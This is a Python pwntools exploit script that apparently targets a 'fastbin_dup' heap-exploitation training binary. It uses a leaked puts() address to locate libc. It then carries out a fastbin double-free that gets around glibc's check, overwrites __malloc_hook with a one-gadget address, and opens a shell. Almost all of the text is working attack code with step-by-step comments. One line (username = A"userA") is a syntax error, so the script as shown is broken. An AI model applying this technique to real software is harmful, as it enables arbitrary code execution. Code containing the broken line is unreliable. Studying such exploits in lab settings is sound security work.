#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = ELF(elf.runpath + b"/libc.so.6")  # Updated path to libc

gdb_script = '''
continue
'''

def launch():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdb_script)
    else:
        return process(elf.path)

# Counter for allocated chunks.
chunk_counter = 0

# Choose the "malloc" option; send the size and data.
# Returns the chunk index.
def allocate(size, content):
    global chunk_counter
    io.sendline(b"1")
    io.sendafter(b"size: ", str(size).encode())
    io.sendafter(b"data: ", content)
    io.recvuntil(b"> ")
    chunk_counter += 1
    return chunk_counter - 1

# Choose the "free" option; send the chunk index.
def release(index):
    io.sendline(b"2")
    io.sendafter(b"index: ", str(index).encode())
    io.recvuntil(b"> ")

io = launch()

# The binary leaks the address of puts(); use it to determine the libc base address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline().strip(), 16) - libc.sym.puts
io.timeout = 0.1


# Ignore the "username" field.
username = A"userA"
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request two chunks of size 0x70.
# The most-significant byte of the _IO_wide_data_0 vtable pointer (0x7f) will be used as a size field later.
# The "dup" chunk will be duplicated, and the "safety" chunk will bypass the fastbins double-free protection.
dup_chunk = allocate(0x68, b"A"*8)
safety_chunk = allocate(0x68, b"B"*8)

# Use the double-free bug to free the "dup" chunk, then the "safety" chunk, and finally the "dup" chunk again.
# This ensures that the "dup" chunk is not at the head of the 0x70 fastbin when it is freed the second time,
# bypassing the fastbins double-free protection.
release(dup_chunk)
release(safety_chunk)
release(dup_chunk)

# The next request for a 0x70-sized chunk will be fulfilled by the "dup" chunk.
# Request it, then overwrite its fastbin fd, pointing it to the fake chunk overlapping the malloc hook,
# where the 0x7f byte of the _IO_wide_data_0 vtable pointer will form the least-significant byte of the size field.
allocate(0x68, p64(libc.sym.__malloc_hook - 0x23))

# Make two more requests for 0x70-sized chunks. The "safety" chunk, then the "dup" chunk are allocated to fulfill these requests.
allocate(0x68, b"C"*8)
allocate(0x68, b"D"*8)

# The next request for a 0x70-sized chunk is fulfilled by the fake chunk overlapping the malloc hook.
# Use it to overwrite the malloc hook with the address of a one-gadget.
allocate(0x68, b"X"*0x13 + p64(libc.address + 0xe1fa1))  # [rsp+0x50] == NULL

# The next call to malloc() will instead trigger the one-gadget and spawn a shell.
# The argument to malloc() is irrelevant as long as it passes the program's size check.
allocate(0x18, b"")


io.interactive()

